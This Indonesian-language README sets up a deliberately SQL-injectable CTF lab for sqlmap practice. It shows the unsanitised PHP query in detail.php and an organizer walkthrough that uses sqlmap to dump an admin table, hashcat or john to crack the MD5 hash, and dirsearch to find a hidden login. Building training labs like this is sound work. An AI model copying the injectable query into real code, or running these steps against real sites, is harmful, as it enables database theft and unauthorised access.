# LAIN CTF â€” SQL Injection Lab (sqlmap practice)

Web CTF latihan SQL injection bertema **Serial Experiments Lain**, dibuat khusus untuk sqlmap.

> Hanya untuk edukasi. Jangan pernah host ini terbuka ke publik tanpa izin.

---

## Deploy (Ubuntu server / di mana saja dengan Docker)

```bash
docker compose up -d --build
```

Akses: `http://<server-ip>:8001`

Saat pertama jalan, MySQL otomatis men-seed database via `db/init.sql` (13 episode + user admin dengan hash MD5).

**Ganti flag:** edit environment `FLAG_ERROR`, `FLAG_ADMIN_PAGE`, `FLAG_DUMP` di `docker-compose.yml`, lalu:
```bash
docker compose down && docker compose up -d --build
```
(Jika volume DB sudah terlanjur ada dan hanya flag dump yang berubah, restart service `web` saja cukup â€” seeder akan menimpa isi tabel `secrets`.)

## Arsitektur

| Service | Image | Keterangan |
|---|---|---|
| `web` | php:8.2-apache | Aplikasi, publish `8001:80` |
| `db` | mysql:5.7 | Port TIDAK dipublish ke host (sqlmap harus lewat web) |

Database:
- `lain` â†’ tabel `episodes` (13 episode, target query `detail.php`)
- `admin` â†’ tabel `admins` (`Lain` / MD5 password) â€” flag TIDAK ada di database

## URL

| Halaman | URL |
|---|---|
| Landing/list episode | `/` (home.php) |
| Detail episode (rentan) | `/detail.php?id=1` |
| Login admin (tersembunyi) | `/administrator/` |

Link admin sengaja tidak ada di halaman manapun â€” peserta harus menemukannya dengan dirsearch.

## Titik Rentan

`detail.php?id=<input>` â€” parameter GET langsung disuntik ke query tanpa sanitasi:

```php
$sql = "SELECT id, title, description FROM episodes WHERE id = " . $id;
```

Error MySQL ditampilkan langsung di halaman (error-based, sangat ramah sqlmap).

## 3 Flag

| # | Flag | Lokasi | Cara dapat |
|---|---|---|---|
| 1 | `FLAG_ERROR` | Halaman error SQL | Buka `detail.php?id=1'` |
| 2 | `FLAG_ADMIN_PAGE` | HTTP response header `X-Hidden-Flag` di `/administrator/` | Dirsearch untuk menemukan path, lalu cek response header (DevTools Network tab / `curl -I`) â€” tidak ada di view-source |
| 3 | `FLAG_DUMP` | Dashboard admin (hanya setelah login) | sqlmap dump â†’ dapat hash MD5 â†’ crack â†’ login â†’ flag tampil di dashboard |

## Walkthrough (ORGANIZER ONLY â€” spoiler)

```bash
# 1. Deteksi injeksi
sqlmap -u "http://<server>:8001/detail.php?id=1" --batch

# 2. Enumerasi database
sqlmap -u "http://<server>:8001/detail.php?id=1" --dbs
#    â†’ lain, admin, information_schema

# 3. Dump database admin
sqlmap -u "http://<server>:8001/detail.php?id=1" -D admin --tables
sqlmap -u "http://<server>:8001/detail.php?id=1" -D admin -T admins --dump
#    â†’ username: Lain | password_hash: 26defa4f6e805a82e9d774080fad7312 (MD5)
#    (flag TIDAK ada di database â€” hanya hash untuk dicrack)

# 4. Crack hash MD5 (password-nya "cyberia")
#    hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt
#    atau john --format=Raw-MD5 hash.txt, atau crackstation.net

# 5. Temukan halaman admin via dirsearch (link admin TIDAK ada di halaman manapun)
#    dirsearch -u http://<server>:8001/ 
#    â†’ /administrator/ (301, buka langsung = form login)
#    FLAG 2 ada di response header X-Hidden-Flag (cek via DevTools Network
#    tab atau curl -I) â€” TIDAK muncul di view-source

# 6. Login di /administrator/ â†’ FLAG 3 tampil di dashboard
```

## Reset lengkap

```bash
docker compose down -v   # -v menghapus volume DB, seed jalan ulang
docker compose up -d --build
```
